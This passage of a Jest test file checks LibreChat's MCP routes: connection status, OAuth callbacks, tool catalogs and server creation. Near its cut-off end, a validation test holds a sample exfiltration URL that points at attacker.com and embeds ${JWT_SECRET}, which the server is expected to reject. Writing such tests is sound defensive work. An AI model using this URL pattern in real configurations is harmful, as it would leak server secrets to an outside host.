      expect(require('@librechat/api').getUserMCPAuthMap).not.toHaveBeenCalled();
      const runtimeContext = getServerConnectionStatus.mock.calls[0][6];
      await expect(
        Promise.all([runtimeContext.loadUserMCPAuthMap(), runtimeContext.loadUserMCPAuthMap()]),
      ).resolves.toEqual([userMCPAuthMap, userMCPAuthMap]);
      await expect(
        Promise.all([runtimeContext.loadMCPAllowlists(), runtimeContext.loadMCPAllowlists()]),
      ).resolves.toEqual([
        { allowedDomains: null, allowedAddresses: null, useSSRFProtection: true },
        { allowedDomains: null, allowedAddresses: null, useSSRFProtection: true },
      ]);
      expect(require('@librechat/api').getUserMCPAuthMap).toHaveBeenCalledWith({
        userId: 'test-user-id',
        servers: ['server1'],
        findPluginAuthsByKeys: require('~/models').findPluginAuthsByKeys,
      });
      expect(require('@librechat/api').getUserMCPAuthMap).toHaveBeenCalledTimes(1);
      expect(mockRegistryInstance.resolveAllowlists).toHaveBeenCalledTimes(1);
      expect(mockRegistryInstance.resolveAllowlists).toHaveBeenCalledWith({
        userId: 'test-user-id',
        role: undefined,
      });
      expect(getServerConnectionStatus).toHaveBeenCalledWith(
        'test-user-id',
        'server1',
        mcpConfig.server1,
        expect.any(Map),
        expect.any(Map),
        expect.any(Set),
        {
          user: expect.objectContaining({ id: 'test-user-id', email: 'user@example.com' }),
          loadUserMCPAuthMap: expect.any(Function),
          loadMCPAllowlists: expect.any(Function),
        },
      );
    });

    it('should resolve independent server statuses concurrently', async () => {
      let releaseFirst;
      let markSecondStarted;
      const firstRelease = new Promise((resolve) => {
        releaseFirst = resolve;
      });
      const secondStarted = new Promise((resolve) => {
        markSecondStarted = resolve;
      });

      getMCPSetupData.mockResolvedValue({
        mcpConfig: {
          server1: { endpoint: 'http://server1.com' },
          server2: { endpoint: 'http://server2.com' },
        },
        appConnections: new Map(),
        userConnections: new Map(),
        oauthServers: new Set(),
      });
      getServerConnectionStatus.mockImplementation(async (_userId, serverName) => {
        if (serverName === 'server1') {
          await firstRelease;
        } else {
          markSecondStarted();
        }
        return {
          connectionState: 'connected',
          requiresOAuth: false,
          authorizationState: 'not_required',
        };
      });

      const responsePromise = request(app)
        .get('/api/mcp/connection/status')
        .then((res) => res);
      await secondStarted;
      releaseFirst();
      const response = await responsePromise;

      expect(response.status).toBe(200);
      expect(getServerConnectionStatus).toHaveBeenCalledTimes(2);
    });

    it('preserves request-scoped metadata when an individual status check fails', async () => {
      getMCPSetupData.mockResolvedValue({
        mcpConfig: {
          server1: {
            source: 'config',
            headers: { 'X-Message': '{{LIBRECHAT_BODY_MESSAGEID}}' },
            customUserVars: { API_KEY: { title: 'API key' } },
          },
        },
        appConnections: new Map(),
        userConnections: new Map(),
        oauthServers: new Set(),
      });
      getServerConnectionStatus.mockRejectedValueOnce(new Error('status unavailable'));

      const response = await request(app).get('/api/mcp/connection/status');

      expect(response.status).toBe(200);
      expect(response.body.connectionStatus.server1).toEqual(
        expect.objectContaining({
          connectionState: 'error',
          requestScoped: true,
          configurationState: 'needs_configuration',
        }),
      );
    });

    it('should return 500 when connection status check fails', async () => {
      getMCPSetupData.mockRejectedValue(new Error('Database error'));

      const response = await request(app).get('/api/mcp/connection/status');

      expect(response.status).toBe(500);
      expect(response.body).toEqual({ error: 'Failed to get connection status' });
    });

    it('should return 401 when user is not authenticated', async () => {
      const unauthApp = express();
      unauthApp.use(express.json());
      unauthApp.use((req, res, next) => {
        req.user = null;
        next();
      });
      unauthApp.use('/api/mcp', mcpRouter);

      const response = await request(unauthApp).get('/api/mcp/connection/status');

      expect(response.status).toBe(401);
      expect(response.body).toEqual({ error: 'User not authenticated' });
    });
  });

  describe('GET /connection/status/:serverName', () => {
    const { getMCPSetupData, getServerConnectionStatus } = require('~/server/services/MCP');

    it('should return connection status for OAuth-required server', async () => {
      const mockMcpConfig = {
        'oauth-server': { endpoint: 'http://oauth-server.com' },
      };

      getMCPSetupData.mockResolvedValue({
        mcpConfig: mockMcpConfig,
        appConnections: {},
        userConnections: {},
        oauthServers: new Set(),
      });

      getServerConnectionStatus.mockResolvedValue({
        connectionState: 'requires_auth',
        requiresOAuth: true,
        authorizationState: 'needs_authorization',
      });
      require('~/server/services/Config').getMCPToolsCacheGeneration.mockResolvedValue(
        'generation-2',
      );

      const response = await request(app).get('/api/mcp/connection/status/oauth-server');

      expect(response.status).toBe(200);
      expect(response.body).toEqual({
        success: true,
        serverName: 'oauth-server',
        connectionStatus: 'requires_auth',
        requiresOAuth: true,
        authorizationState: 'needs_authorization',
        authorizationGeneration: 'generation-2',
      });
    });

    it('keeps connection status available when the shared generation cache is unavailable', async () => {
      getMCPSetupData.mockResolvedValue({
        mcpConfig: { 'oauth-server': { endpoint: 'http://oauth-server.com' } },
        appConnections: {},
        userConnections: {},
        oauthServers: new Set(['oauth-server']),
      });
      getServerConnectionStatus.mockResolvedValue({
        connectionState: 'requires_auth',
        requiresOAuth: true,
        authorizationState: 'needs_authorization',
      });
      require('~/server/services/Config').getMCPToolsCacheGeneration.mockRejectedValueOnce(
        new Error('cache unavailable'),
      );

      const response = await request(app).get('/api/mcp/connection/status/oauth-server');

      expect(response.status).toBe(200);
      expect(response.body).toEqual({
        success: true,
        serverName: 'oauth-server',
        connectionStatus: 'requires_auth',
        requiresOAuth: true,
        authorizationState: 'needs_authorization',
      });
    });

    it('should return 404 when server is not found in configuration', async () => {
      getMCPSetupData.mockResolvedValue({
        mcpConfig: {
          'other-server': { endpoint: 'http://other-server.com' },
        },
        appConnections: {},
        userConnections: {},
        oauthServers: new Set(),
      });

      const response = await request(app).get('/api/mcp/connection/status/non-existent-server');

      expect(response.status).toBe(404);
      expect(response.body).toEqual({
        error: "MCP server 'non-existent-server' not found in configuration",
      });
    });

    it('should return 500 when connection status check fails', async () => {
      getMCPSetupData.mockRejectedValue(new Error('Database connection failed'));

      const response = await request(app).get('/api/mcp/connection/status/test-server');

      expect(response.status).toBe(500);
      expect(response.body).toEqual({ error: 'Failed to get connection status' });
    });

    it('should return 401 when user is not authenticated', async () => {
      const unauthApp = express();
      unauthApp.use(express.json());
      unauthApp.use((req, res, next) => {
        req.user = null;
        next();
      });
      unauthApp.use('/api/mcp', mcpRouter);

      const response = await request(unauthApp).get('/api/mcp/connection/status/test-server');

      expect(response.status).toBe(401);
      expect(response.body).toEqual({ error: 'User not authenticated' });
    });
  });

  describe('GET /:serverName/auth-values', () => {
    const { getUserPluginAuthValue } = require('~/server/services/PluginService');
    // mockRegistryInstance is defined at the top of the file

    it('should return auth value flags for server', async () => {
      const mockMcpManager = {};

      mockRegistryInstance.getServerConfig.mockResolvedValue({
        customUserVars: {
          API_KEY: 'some-env-var',
          SECRET_TOKEN: 'another-env-var',
        },
      });
      require('~/config').getMCPManager.mockReturnValue(mockMcpManager);
      getUserPluginAuthValue.mockResolvedValueOnce('some-api-key-value').mockResolvedValueOnce('');

      const response = await request(app).get('/api/mcp/test-server/auth-values');

      expect(response.status).toBe(200);
      expect(response.body).toEqual({
        success: true,
        serverName: 'test-server',
        authValueFlags: {
          API_KEY: true,
          SECRET_TOKEN: false,
        },
      });

      expect(getUserPluginAuthValue).toHaveBeenCalledTimes(2);
    });

    it('should return 404 when server is not found in configuration', async () => {
      const mockMcpManager = {};

      mockRegistryInstance.getServerConfig.mockResolvedValue(null);
      require('~/config').getMCPManager.mockReturnValue(mockMcpManager);

      const response = await request(app).get('/api/mcp/non-existent-server/auth-values');

      expect(response.status).toBe(404);
      expect(response.body).toEqual({
        error: "MCP server 'non-existent-server' not found in configuration",
      });
    });

    it('should handle errors when checking auth values', async () => {
      const mockMcpManager = {};

      mockRegistryInstance.getServerConfig.mockResolvedValue({
        customUserVars: {
          API_KEY: 'some-env-var',
        },
      });
      require('~/config').getMCPManager.mockReturnValue(mockMcpManager);
      getUserPluginAuthValue.mockRejectedValue(new Error('Database error'));

      const response = await request(app).get('/api/mcp/test-server/auth-values');

      expect(response.status).toBe(200);
      expect(response.body).toEqual({
        success: true,
        serverName: 'test-server',
        authValueFlags: {
          API_KEY: false,
        },
      });
    });

    it('should return 500 when auth values check throws unexpected error', async () => {
      const mockMcpManager = {};

      mockRegistryInstance.getServerConfig.mockImplementation(() => {
        throw new Error('Config loading failed');
      });
      require('~/config').getMCPManager.mockReturnValue(mockMcpManager);

      const response = await request(app).get('/api/mcp/test-server/auth-values');

      expect(response.status).toBe(500);
      expect(response.body).toEqual({ error: 'Failed to check auth value flags' });
    });

    it('should handle customUserVars that is not an object', async () => {
      const mockMcpManager = {};

      mockRegistryInstance.getServerConfig.mockResolvedValue({
        customUserVars: 'not-an-object',
      });
      require('~/config').getMCPManager.mockReturnValue(mockMcpManager);

      const response = await request(app).get('/api/mcp/test-server/auth-values');

      expect(response.status).toBe(200);
      expect(response.body).toEqual({
        success: true,
        serverName: 'test-server',
        authValueFlags: {},
      });
    });

    it('should return 401 when user is not authenticated in auth-values endpoint', async () => {
      const appWithoutAuth = express();
      appWithoutAuth.use(express.json());
      appWithoutAuth.use('/api/mcp', mcpRouter);

      const response = await request(appWithoutAuth).get('/api/mcp/test-server/auth-values');

      expect(response.status).toBe(401);
      expect(response.body).toEqual({ error: 'User not authenticated' });
    });
  });

  describe('GET /:serverName/oauth/callback - Edge Cases', () => {
    it('should handle OAuth callback without toolFlowId (falsy toolFlowId)', async () => {
      const { MCPOAuthHandler, MCPTokenStorage } = require('@librechat/api');
      const mockTokens = {
        access_token: 'edge-access-token',
        refresh_token: 'edge-refresh-token',
      };
      MCPOAuthHandler.getFlowState = jest.fn().mockResolvedValue({
        id: 'test-user-id:test-server',
        state: 'test-user-id:test-server',
        userId: 'test-user-id',
        metadata: {
          serverUrl: 'https://example.com',
          oauth: {},
          // No toolFlowId property
        },
        clientInfo: {},
        codeVerifier: 'test-verifier',
      });
      MCPOAuthHandler.completeOAuthFlow = jest.fn();
      mockOAuthCompletion(mockTokens);
      MCPTokenStorage.storeTokens.mockResolvedValue();
      mockRegistryInstance.getServerConfig.mockResolvedValue({});

      const mockFlowManager = {
        getFlowState: jest.fn().mockResolvedValue({ status: 'PENDING', createdAt: Date.now() }),
        completeFlow: jest.fn(),
        deleteFlow: jest.fn().mockResolvedValue(true),
      };
      require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);

      const mockMcpManager = createLeasedMcpManager({
        fetchToolsSnapshot: jest.fn().mockResolvedValue({ tools: [], complete: true }),
      });
      require('~/config').getMCPManager.mockReturnValue(mockMcpManager);

      const flowId = 'test-user-id:test-server';
      const csrfToken = generateTestCsrfToken(flowId);

      const response = await request(app)
        .get(`/api/mcp/test-server/oauth/callback?code=test-code&state=${flowId}`)
        .set('Cookie', [`oauth_csrf=${csrfToken}`])
        .expect(302);

      const basePath = getBasePath();

      expect(mockFlowManager.completeFlow).toHaveBeenCalledWith(flowId, 'mcp_oauth', mockTokens);
      expect(response.headers.location).toContain(`${basePath}/oauth/success`);
    });

    it('should handle null cached tools in OAuth callback (triggers || {} fallback)', async () => {
      const { getCachedTools } = require('~/server/services/Config');
      getCachedTools.mockResolvedValue(null);
      const { MCPOAuthHandler, MCPTokenStorage } = require('@librechat/api');
      const mockTokens = {
        access_token: 'edge-access-token',
        refresh_token: 'edge-refresh-token',
      };

      const mockFlowManager = {
        getFlowState: jest.fn().mockResolvedValue({
          id: 'test-user-id:test-server',
          userId: 'test-user-id',
          metadata: { serverUrl: 'https://example.com', oauth: {} },
          clientInfo: {},
          codeVerifier: 'test-verifier',
        }),
        completeFlow: jest.fn(),
      };
      require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);
      MCPOAuthHandler.getFlowState.mockResolvedValue({
        state: 'test-user-id:test-server',
        serverName: 'test-server',
        userId: 'test-user-id',
        metadata: { serverUrl: 'https://example.com', oauth: {} },
        clientInfo: {},
        codeVerifier: 'test-verifier',
      });
      mockOAuthCompletion(mockTokens);
      MCPTokenStorage.storeTokens.mockResolvedValue();
      mockRegistryInstance.getServerConfig.mockResolvedValue({});

      const mockMcpManager = createLeasedMcpManager(
        {
          fetchToolsSnapshot: jest.fn().mockResolvedValue({
            tools: [{ name: 'test-tool', description: 'Test tool' }],
            complete: true,
          }),
        },
        { getToolPublicationGeneration: jest.fn().mockReturnValue('oauth-connection-generation') },
      );
      require('~/config').getMCPManager.mockReturnValue(mockMcpManager);

      const flowId = 'test-user-id:test-server';
      const csrfToken = generateTestCsrfToken(flowId);

      const response = await request(app)
        .get(`/api/mcp/test-server/oauth/callback?code=test-code&state=${flowId}`)
        .set('Cookie', [`oauth_csrf=${csrfToken}`])
        .expect(302);

      const basePath = getBasePath();

      expect(response.headers.location).toContain(`${basePath}/oauth/success`);
      expect(require('~/server/services/Config/mcp').updateMCPServerTools).toHaveBeenCalledWith(
        expect.objectContaining({
          userId: 'test-user-id',
          serverName: 'test-server',
          tools: [{ name: 'test-tool', description: 'Test tool' }],
          publicationGeneration: 'oauth-connection-generation',
        }),
      );
    });

    it('preserves cached tools when the post-OAuth snapshot is incomplete', async () => {
      const { logger } = require('@librechat/data-schemas');
      const { MCPOAuthHandler, MCPTokenStorage } = require('@librechat/api');
      const mockTokens = {
        access_token: 'edge-access-token',
        refresh_token: 'edge-refresh-token',
      };
      const mockFlowManager = {
        getFlowState: jest.fn().mockResolvedValue({
          status: 'PENDING',
          createdAt: Date.now(),
        }),
        completeFlow: jest.fn(),
      };
      require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);
      MCPOAuthHandler.getFlowState.mockResolvedValue({
        state: 'test-user-id:test-server',
        serverName: 'test-server',
        userId: 'test-user-id',
        metadata: { serverUrl: 'https://example.com', oauth: {} },
        clientInfo: {},
        codeVerifier: 'test-verifier',
      });
      mockOAuthCompletion(mockTokens);
      MCPTokenStorage.storeTokens.mockResolvedValue();
      mockRegistryInstance.getServerConfig.mockResolvedValue({});
      require('~/config').getMCPManager.mockReturnValue(
        createLeasedMcpManager(
          {
            fetchToolsSnapshot: jest.fn().mockResolvedValue({
              tools: [{ name: 'partial-tool', description: 'Only the first page' }],
              complete: false,
            }),
          },
          {
            getToolPublicationGeneration: jest.fn().mockReturnValue('oauth-connection-generation'),
          },
        ),
      );

      const flowId = 'test-user-id:test-server';
      const csrfToken = generateTestCsrfToken(flowId);
      await request(app)
        .get(`/api/mcp/test-server/oauth/callback?code=test-code&state=${flowId}`)
        .set('Cookie', [`oauth_csrf=${csrfToken}`])
        .expect(302);

      expect(require('~/server/services/Config/mcp').updateMCPServerTools).not.toHaveBeenCalled();
      expect(logger.warn).toHaveBeenCalledWith(
        '[MCP OAuth] Preserving cached tools for test-server because tools/list returned an incomplete snapshot',
      );
    });
  });

  describe('GET /:serverName/oauth/callback - Tenant Context', () => {
    beforeEach(() => {
      const { getTenantId, tenantStorage } = require('@librechat/data-schemas');
      const { MCPOAuthHandler, MCPTokenStorage } = require('@librechat/api');
      getTenantId.mockReset();
      tenantStorage.run.mockReset();
      tenantStorage.run.mockImplementation((store, fn) => fn());
      MCPOAuthHandler.resolveStateToFlowId.mockReset();
      MCPOAuthHandler.getFlowState.mockReset();
      MCPOAuthHandler.completeOAuthFlow.mockReset();
      MCPTokenStorage.storeTokens.mockReset();
      mockRegistryInstance.getServerConfig.mockResolvedValue({});
    });

    it('should wrap callback body in tenantStorage.run when flowState has tenantId and no current context', async () => {
      const { getTenantId, tenantStorage } = require('@librechat/data-schemas');
      const { MCPOAuthHandler, MCPTokenStorage } = require('@librechat/api');
      const flowId = 'user123:test-server';
      const csrfToken = generateTestCsrfToken(flowId);

      getTenantId.mockReturnValue(undefined);

      MCPOAuthHandler.resolveStateToFlowId.mockResolvedValue(flowId);
      MCPOAuthHandler.getFlowState.mockResolvedValue({
        state: flowId,
        serverName: 'test-server',
        userId: 'user123',
        tenantId: 'tenant-abc',
        metadata: {},
        clientInfo: {},
        codeVerifier: 'test-verifier',
      });
      mockOAuthCompletion({
        access_token: 'token',
        token_type: 'bearer',
      });
      MCPTokenStorage.storeTokens.mockResolvedValue();
      require('~/config').getFlowStateManager.mockReturnValue({
        getFlowState: jest.fn().mockResolvedValue({
          status: 'PENDING',
          createdAt: Date.now(),
        }),
        completeFlow: jest.fn(),
      });

      const response = await request(app)
        .get(`/api/mcp/test-server/oauth/callback?code=test-code&state=${flowId}`)
        .set('Cookie', [`oauth_csrf=${csrfToken}`])
        .expect(302);

      expect(tenantStorage.run).toHaveBeenCalledWith(
        { tenantId: 'tenant-abc' },
        expect.any(Function),
      );
      expect(MCPTokenStorage.storeTokens).toHaveBeenCalled();

      const basePath = getBasePath();
      expect(response.headers.location).toContain(`${basePath}/oauth/success`);
    });

    it('should not call tenantStorage.run when flowState has no tenantId', async () => {
      const { getTenantId, tenantStorage } = require('@librechat/data-schemas');
      const { MCPOAuthHandler, MCPTokenStorage } = require('@librechat/api');
      const flowId = 'user123:test-server';
      const csrfToken = generateTestCsrfToken(flowId);

      getTenantId.mockReturnValue(undefined);

      MCPOAuthHandler.resolveStateToFlowId.mockResolvedValue(flowId);
      MCPOAuthHandler.getFlowState.mockResolvedValue({
        serverName: 'test-server',
        userId: 'user123',
        metadata: {},
        clientInfo: {},
        codeVerifier: 'test-verifier',
      });
      mockOAuthCompletion({
        access_token: 'token',
        token_type: 'bearer',
      });
      MCPTokenStorage.storeTokens.mockResolvedValue();

      await request(app)
        .get(`/api/mcp/test-server/oauth/callback?code=test-code&state=${flowId}`)
        .set('Cookie', [`oauth_csrf=${csrfToken}`])
        .expect(302);

      expect(tenantStorage.run).not.toHaveBeenCalled();
    });
  });

  describe('GET /tools', () => {
    it('should deny MCP tools when user lacks MCP server use permission', async () => {
      mockMCPUseAllowed = false;

      const response = await request(app).get('/api/mcp/tools');

      expect(response.status).toBe(403);
      expect(response.body).toEqual({ message: 'Forbidden: Insufficient permissions' });
      expect(mockResolveAllMcpConfigs).not.toHaveBeenCalled();
    });

    it('delegates catalog loading and renders the returned tools', async () => {
      const { Constants } = require('librechat-data-provider');
      const pluginKey = `search${Constants.mcp_delimiter}user-server`;
      const serverTools = {
        [pluginKey]: {
          type: 'function',
          function: {
            name: pluginKey,
            description: 'Search',
            parameters: { type: 'object' },
          },
        },
      };
      const serverConfig = { type: 'sse', url: 'https://user.example.com/sse' };
      const recoveryPolicy = { discoveryBackoffMs: [125, 250] };
      mockRequestConfig = { mcpSettings: { catalogRecovery: recoveryPolicy } };
      mockResolveAllMcpConfigs.mockResolvedValueOnce({ 'user-server': serverConfig });
      mockLoadMCPServerCatalogs.mockResolvedValueOnce({
        serverTools: new Map([['user-server', serverTools]]),
        serversWithoutTools: [],
      });

      const response = await request(app).get('/api/mcp/tools');

      expect(response.status).toBe(200);
      expect(response.body.servers['user-server'].tools).toEqual([
        { name: 'search', pluginKey, description: 'Search' },
      ]);
      expect(mockLoadMCPServerCatalogs).toHaveBeenCalledWith({
        user: { id: 'test-user-id' },
        servers: [{ serverName: 'user-server', serverConfig }],
        upstreamTokenProvider: expect.any(Function),
        oboIdentityContext: expect.any(Object),
        signal: expect.any(AbortSignal),
        recoveryPolicy,
        mcpApps: defaultMCPAppsPolicy,
      });
    });

    it('renders an authoritative empty catalog as a configured server', async () => {
      const serverConfig = { type: 'sse', url: 'https://empty.example.com/sse' };
      mockResolveAllMcpConfigs.mockResolvedValueOnce({ 'empty-server': serverConfig });
      mockLoadMCPServerCatalogs.mockResolvedValueOnce({
        serverTools: new Map([['empty-server', {}]]),
        serversWithoutTools: [],
      });

      const response = await request(app).get('/api/mcp/tools');

      expect(response.status).toBe(200);
      expect(response.body.servers['empty-server'].tools).toEqual([]);
    });

    it('renders a passively recovered catalog returned by the loader', async () => {
      const { Constants } = require('librechat-data-provider');
      const pluginKey = `search${Constants.mcp_delimiter}connected-server`;
      const serverTools = {
        [pluginKey]: {
          type: 'function',
          function: {
            name: pluginKey,
            description: 'Search',
            parameters: { type: 'object' },
          },
        },
      };
      const serverConfig = { type: 'sse', url: 'https://connected.example.com/sse' };
      mockResolveAllMcpConfigs.mockResolvedValueOnce({ 'connected-server': serverConfig });
      mockLoadMCPServerCatalogs.mockResolvedValueOnce({
        serverTools: new Map([['connected-server', serverTools]]),
        serversWithoutTools: [],
      });

      const response = await request(app).get('/api/mcp/tools');

      expect(response.status).toBe(200);
      expect(response.body.servers['connected-server'].tools).toEqual([
        {
          name: 'search',
          pluginKey,
          description: 'Search',
        },
      ]);
      expect(mockLoadMCPServerCatalogs).toHaveBeenCalledWith({
        user: { id: 'test-user-id' },
        servers: [{ serverName: 'connected-server', serverConfig }],
        upstreamTokenProvider: expect.any(Function),
        oboIdentityContext: expect.any(Object),
        signal: expect.any(AbortSignal),
        recoveryPolicy: undefined,
        mcpApps: defaultMCPAppsPolicy,
      });
    });

    it('reports a stable reauthorization state from passive discovery', async () => {
      const serverConfig = { type: 'sse', url: 'https://oauth.example.com/sse' };
      mockResolveAllMcpConfigs.mockResolvedValueOnce({ oauth: serverConfig });
      mockLoadMCPServerCatalogs.mockResolvedValueOnce({
        serverTools: new Map([['oauth', {}]]),
        serversWithoutTools: [],
        reauthRequiredServers: new Set(['oauth']),
      });

      const response = await request(app).get('/api/mcp/tools');

      expect(response.status).toBe(200);
      expect(response.body.servers.oauth).toMatchObject({
        authenticated: false,
        authorizationState: 'reauth_required',
      });
    });

    it('continues rendering available tools when another server has no catalog', async () => {
      const { Constants } = require('librechat-data-provider');
      const configs = {
        'bad-server': {
          type: 'sse',
          url: 'https://bad.example.com/sse',
        },
        'good-server': {
          type: 'sse',
          url: 'https://good.example.com/sse',
          iconPath: '/icons/good.svg',
        },
      };
      mockResolveAllMcpConfigs.mockResolvedValueOnce(configs);
      mockLoadMCPServerCatalogs.mockResolvedValueOnce({
        serverTools: new Map([
          [
            'good-server',
            {
              [`search${Constants.mcp_delimiter}good-server`]: {
                type: 'function',
                function: {
                  name: `search${Constants.mcp_delimiter}good-server`,
                  description: 'Search good server',
                  parameters: { type: 'object' },
                },
              },
            },
          ],
        ]),
        serversWithoutTools: ['bad-server'],
      });

      const response = await request(app).get('/api/mcp/tools');

      expect(response.status).toBe(200);
      expect(response.body.servers['good-server']).toMatchObject({
        name: 'good-server',
        icon: '/icons/good.svg',
        tools: [
          {
            name: 'search',
            pluginKey: `search${Constants.mcp_delimiter}good-server`,
            description: 'Search good server',
          },
        ],
      });
      expect(response.body.servers['bad-server']).toMatchObject({
        name: 'bad-server',
        tools: [],
      });
    });

    it('should return configured servers when all cache lookups fail', async () => {
      const { logger } = require('@librechat/data-schemas');
      const configs = {
        'first-server': {
          type: 'sse',
          url: 'https://first.example.com/sse',
        },
        'second-server': {
          type: 'sse',
          url: 'https://second.example.com/sse',
        },
      };
      mockResolveAllMcpConfigs.mockResolvedValueOnce(configs);
      mockLoadMCPServerCatalogs.mockResolvedValueOnce({
        serverTools: new Map(),
        serversWithoutTools: ['first-server', 'second-server'],
      });

      const response = await request(app).get('/api/mcp/tools');

      expect(response.status).toBe(200);
      expect(response.body.servers['first-server']).toMatchObject({
        name: 'first-server',
        tools: [],
      });
      expect(response.body.servers['second-server']).toMatchObject({
        name: 'second-server',
        tools: [],
      });
      expect(logger.debug).toHaveBeenCalledTimes(1);
      expect(logger.debug).toHaveBeenCalledWith(
        '[getMCPTools] No tools (2): first-server, second-server',
      );
      expect(mockLoadMCPServerCatalogs).toHaveBeenCalledTimes(1);
      expect(mockLoadMCPServerCatalogs).toHaveBeenCalledWith({
        user: { id: 'test-user-id' },
        servers: Object.entries(configs).map(([serverName, serverConfig]) => ({
          serverName,
          serverConfig,
        })),
        upstreamTokenProvider: expect.any(Function),
        oboIdentityContext: expect.any(Object),
        signal: expect.any(AbortSignal),
        recoveryPolicy: undefined,
        mcpApps: defaultMCPAppsPolicy,
      });
    });

    it('returns a retryable failure when process-wide catalog capacity is saturated', async () => {
      const { MCPCatalogCapacityError } = require('@librechat/api');
      mockResolveAllMcpConfigs.mockResolvedValueOnce({
        saturated: { type: 'sse', url: 'https://saturated.example.com/sse' },
      });
      mockLoadMCPServerCatalogs.mockRejectedValueOnce(new MCPCatalogCapacityError());

      const response = await request(app).get('/api/mcp/tools');

      expect(response.status).toBe(503);
      expect(response.body).toEqual({ message: 'MCP catalog capacity is temporarily exhausted' });
    });
  });

  describe('GET /servers', () => {
    // mockRegistryInstance is defined at the top of the file

    it('should return all server configs for authenticated user', async () => {
      const mockServerConfigs = {
        'server-1': {
          type: 'sse',
          url: 'http://server1.com/sse',
          title: 'Server 1',
          source: 'user',
        },
        'server-2': {
          type: 'sse',
          url: 'http://server2.com/sse',
          title: 'Server 2',
          source: 'user',
        },
      };

      mockResolveAllMcpConfigs.mockResolvedValue(mockServerConfigs);

      const response = await request(app).get('/api/mcp/servers');

      expect(response.status).toBe(200);
      expect(response.body['server-1']).toMatchObject({
        type: 'sse',
        url: 'http://server1.com/sse',
        title: 'Server 1',
      });
      expect(response.body['server-2']).toMatchObject({
        type: 'sse',
        url: 'http://server2.com/sse',
        title: 'Server 2',
      });
      expect(response.body['server-1'].headers).toBeUndefined();
      expect(response.body['server-2'].headers).toBeUndefined();
      expect(mockResolveAllMcpConfigs).toHaveBeenCalledWith(
        'test-user-id',
        expect.objectContaining({ id: 'test-user-id' }),
      );
    });

    it('should return empty object when no servers are configured', async () => {
      mockResolveAllMcpConfigs.mockResolvedValue({});

      const response = await request(app).get('/api/mcp/servers');

      expect(response.status).toBe(200);
      expect(response.body).toEqual({});
    });

    it('should return 401 when user is not authenticated', async () => {
      const unauthApp = express();
      unauthApp.use(express.json());
      unauthApp.use((req, _res, next) => {
        req.user = null;
        next();
      });
      unauthApp.use('/api/mcp', mcpRouter);

      const response = await request(unauthApp).get('/api/mcp/servers');

      expect(response.status).toBe(401);
      expect(response.body).toEqual({ message: 'Unauthorized' });
    });

    it('should return 500 when server config retrieval fails', async () => {
      mockResolveAllMcpConfigs.mockRejectedValue(new Error('Database error'));

      const response = await request(app).get('/api/mcp/servers');

      expect(response.status).toBe(500);
      expect(response.body).toEqual({ error: 'Database error' });
    });
  });

  describe('POST /servers', () => {
    const { MCPConnection } = require('@librechat/api');

    it('should create MCP server with valid SSE config', async () => {
      const validConfig = {
        type: 'sse',
        url: 'https://mcp-server.example.com/sse',
        title: 'Test SSE Server',
        description: 'A test SSE server',
      };

      mockRegistryInstance.addServer.mockResolvedValue({
        serverName: 'test-sse-server',
        config: { ...validConfig, source: 'user' },
      });

      const response = await request(app).post('/api/mcp/servers').send({ config: validConfig });

      expect(response.status).toBe(201);
      expect(response.body.serverName).toBe('test-sse-server');
      expect(response.body.type).toBe('sse');
      expect(response.body.url).toBe('https://mcp-server.example.com/sse');
      expect(response.body.title).toBe('Test SSE Server');
      expect(mockRegistryInstance.addServer).toHaveBeenCalledWith(
        expect.stringMatching(/^temp_server_[0-9a-f-]{36}$/),
        expect.objectContaining({
          type: 'sse',
          url: 'https://mcp-server.example.com/sse',
        }),
        'DB',
        'test-user-id',
        [],
      );
      const inspectionServerName = mockRegistryInstance.addServer.mock.calls[0][0];
      expect(MCPConnection.clearCooldown).toHaveBeenCalledWith(inspectionServerName);
    });

    it('should reserve config-managed server names when creating MCP server', async () => {
      const validConfig = {
        type: 'sse',
        url: 'https://mcp-server.example.com/sse',
        title: 'Test SSE Server',
      };

      mockResolveMcpConfigNames.mockResolvedValueOnce(['config_slack']);
      mockRegistryInstance.addServer.mockResolvedValue({
        serverName: 'test-sse-server',
        config: validConfig,
      });

      const response = await request(app).post('/api/mcp/servers').send({ config: validConfig });

      expect(response.status).toBe(201);
      expect(mockRegistryInstance.addServer).toHaveBeenCalledWith(
        expect.stringMatching(/^temp_server_[0-9a-f-]{36}$/),
        expect.objectContaining({
          type: 'sse',
          url: 'https://mcp-server.example.com/sse',
        }),
        'DB',
        'test-user-id',
        ['config_slack'],
      );
    });

    it('reserves the normalized spelling of special-character config names too', async () => {
      /** Tool keys embed `normalizeServerName(server)`, so a generated slug
       *  must not collide with that form either. */
      const validConfig = {
        type: 'sse',
        url: 'https://mcp-server.example.com/sse',
        title: 'Test SSE Server',
      };

      mockResolveMcpConfigNames.mockResolvedValueOnce(['Connector: Company']);
      mockRegistryInstance.addServer.mockResolvedValue({
        serverName: 'test-sse-server',
        config: validConfig,
      });

      const response = await request(app).post('/api/mcp/servers').send({ config: validConfig });

      expect(response.status).toBe(201);
      expect(mockRegistryInstance.addServer).toHaveBeenCalledWith(
        expect.stringMatching(/^temp_server_[0-9a-f-]{36}$/),
        expect.anything(),
        'DB',
        'test-user-id',
        ['Connector: Company', 'Connector__Company'],
      );
    });

    it('should reject stdio config for security reasons', async () => {
      const stdioConfig = {
        type: 'stdio',
        command: 'node',
        args: ['server.js'],
        title: 'Test Stdio Server',
      };

      const response = await request(app).post('/api/mcp/servers').send({ config: stdioConfig });

      // Stdio transport is not allowed via API - only admins can configure it via YAML
      expect(response.status).toBe(400);
      expect(response.body.message).toBe('Invalid configuration');
    });

    it('should return 400 for invalid configuration', async () => {
      const invalidConfig = {
        type: 'sse',
        // Missing required 'url' field
        title: 'Invalid Server',
      };

      const response = await request(app).post('/api/mcp/servers').send({ config: invalidConfig });

      expect(response.status).toBe(400);
      expect(response.body.message).toBe('Invalid configuration');
      expect(response.body.errors).toBeDefined();
    });

    it('should return 400 for SSE config with invalid URL protocol', async () => {
      const invalidConfig = {
        type: 'sse',
        url: 'ws://invalid-protocol.example.com/sse',
        title: 'Invalid Protocol Server',
      };

      const response = await request(app).post('/api/mcp/servers').send({ config: invalidConfig });

      expect(response.status).toBe(400);
      expect(response.body.message).toBe('Invalid configuration');
    });

    it('should reject SSE URL containing env variable references', async () => {
      const response = await request(app)
        .post('/api/mcp/servers')
        .send({
          config: {
            type: 'sse',
            url: 'http://attacker.com/?secret=${JWT_SECRET}',
          },
        });

      expect(response.status).toBe(400);
